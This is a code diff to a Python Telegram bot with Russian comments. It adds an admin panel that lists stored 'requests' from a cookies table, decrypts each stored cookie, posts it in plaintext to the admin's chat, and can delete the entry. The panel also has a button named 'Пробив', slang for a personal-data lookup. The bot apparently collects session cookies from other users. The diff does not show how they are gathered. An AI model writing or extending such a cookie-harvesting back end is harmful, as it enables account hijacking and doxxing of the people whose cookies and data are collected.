@@ -9,6 +9,13 @@ import sys
 import os
 from cryptography.fernet import Fernet
 
+# Загружаем переменные окружения из .env файла (для локального запуска)
+try:
+    from dotenv import load_dotenv
+    load_dotenv()
+except ImportError:
+    pass  # dotenv не установлен, используем системные переменные
+
 # Получаем токен бота из переменных окружения
 BOT_TOKEN = os.environ.get('BOT_TOKEN')
 if not BOT_TOKEN:
@@ -368,6 +375,76 @@ def handle_profile_button(message):
     else:
         bot.send_message(message.chat.id, "Упс.. Что-то пошло не так!")
 
+@bot.callback_query_handler(func=lambda call: True)
+def handle_callback(call):
+    """Обработчик inline кнопок"""
+    if call.data.startswith("view_req_"):
+        # Просмотр заявки
+        req_id = int(call.data.split("_")[2])
+        
+        conn = sqlite3.connect(DATABASE_FILE)
+        cursor = conn.cursor()
+        cursor.execute("""
+            SELECT encrypted_cookie, username, unique_id, created_at 
+            FROM cookies 
+            WHERE id = ?
+        """, (req_id,))
+        
+        result = cursor.fetchone()
+        conn.close()
+        
+        if not result:
+            bot.answer_callback_query(call.id, "❌ Заявка не найдена")
+            return
+        
+        encrypted_cookie, username, unique_id, created_at = result
+        
+        try:
+            # Расшифровываем
+            decrypted_cookie = cipher.decrypt(encrypted_cookie.encode()).decode()
+            
+            # Создаем кнопку удаления
+            delete_markup = telebot.types.InlineKeyboardMarkup()
+            delete_btn = telebot.types.InlineKeyboardButton(
+                text="🗑️ Удалить заявку",
+                callback_data=f"del_req_{req_id}"
+            )
+            delete_markup.add(delete_btn)
+            
+            # Отправляем расшифрованные данные
+            bot.send_message(
+                call.message.chat.id,
+                f"🔓 Расшифрованные данные\n"
+                f"👤 @{username}\n"
+                f"🆔 {unique_id}\n"
+                f"⏰ {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(created_at))}\n\n"
+                f"{decrypted_cookie}",
+                reply_markup=delete_markup
+            )
+            
+            bot.answer_callback_query(call.id, "✅ Заявка расшифрована")
+        
+        except Exception as e:
+            bot.answer_callback_query(call.id, f"❌ Ошибка: {str(e)}")
+    
+    elif call.data.startswith("del_req_"):
+        # Удаление заявки
+        req_id = int(call.data.split("_")[2])
+        
+        conn = sqlite3.connect(DATABASE_FILE)
+        cursor = conn.cursor()
+        cursor.execute("DELETE FROM cookies WHERE id = ?", (req_id,))
+        conn.commit()
+        conn.close()
+        
+        # Удаляем сообщение с заявкой
+        try:
+            bot.delete_message(call.message.chat.id, call.message.message_id)
+        except:
+            pass
+        
+        bot.answer_callback_query(call.id, "🗑️ Заявка удалена")
+
 @bot.message_handler(func=lambda message: message.reply_to_message is not None)
 def handle_reply(message):
     """Обработчик ответов на сообщения через reply"""
@@ -653,13 +730,16 @@ def admin_panel(message):
     if message.from_user.id in admin_ids or is_user_admin(message.from_user.id):
         markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
         button_users = telebot.types.KeyboardButton(text='👩‍👦Люди')
+        button_requests = telebot.types.KeyboardButton(text='📋Заявки')
         button_broadcast = telebot.types.KeyboardButton(text='📢Рассылка')
         button_ban = telebot.types.KeyboardButton(text='⛔️Забанить')
         button_unban = telebot.types.KeyboardButton(text='✅Разбанить')
         button_add_admin = telebot.types.KeyboardButton(text='👑Сделать админом')
         button_remove_admin = telebot.types.KeyboardButton(text='❌Удалить админа')
         button_probiv = telebot.types.KeyboardButton(text='🔍Пробив')
-        markup.add(button_users, button_broadcast, button_ban, button_unban, button_add_admin, button_remove_admin, button_probiv)
+        markup.add(button_users, button_requests)
+        markup.add(button_broadcast, button_ban, button_unban)
+        markup.add(button_add_admin, button_remove_admin, button_probiv)
         bot.send_message(message.chat.id, "Админ-панель", reply_markup=markup)
     else:
         bot.reply_to(message, "❌ У вас нет прав.")
@@ -682,6 +762,48 @@ def handle_users_button(message):
             response += "Нет пользователей."
 
         bot.send_message(message.chat.id, response, reply_markup = telebot.types.ReplyKeyboardRemove())
+
+@bot.message_handler(func=lambda message: message.text == "📋Заявки")
+def handle_requests_button(message):
+    """Показывает список всех заявок с кнопками"""
+    if is_user_banned(message.from_user.id):
+        bot.send_message(message.chat.id, "Вы были забанены в боте.")
+        return
+    
+    if message.from_user.id not in admin_ids and not is_user_admin(message.from_user.id):
+        bot.reply_to(message, "❌ У вас нет прав")
+        return
+    
+    conn = sqlite3.connect(DATABASE_FILE)
+    cursor = conn.cursor()
+    cursor.execute("""
+        SELECT id, username, unique_id, created_at 
+        FROM cookies 
+        ORDER BY created_at DESC 
+        LIMIT 20
+    """)
+    requests = cursor.fetchall()
+    conn.close()
+    
+    if not requests:
+        bot.send_message(message.chat.id, "📋 Заявок нет", reply_markup=telebot.types.ReplyKeyboardRemove())
+        return
+    
+    # Создаем inline кнопки для каждой заявки
+    markup = telebot.types.InlineKeyboardMarkup()
+    for req_id, username, unique_id, created_at in requests:
+        time_str = time.strftime('%d.%m %H:%M', time.localtime(created_at))
+        button = telebot.types.InlineKeyboardButton(
+            text=f"@{username} ({unique_id}) - {time_str}",
+            callback_data=f"view_req_{req_id}"
+        )
+        markup.add(button)
+    
+    bot.send_message(
+        message.chat.id, 
+        f"📋 Последние 20 заявок:\n\nНажмите на заявку для просмотра",
+        reply_markup=markup
+    )
 
 # Словарь для хранения состояния рассылки
 broadcast_state = {}
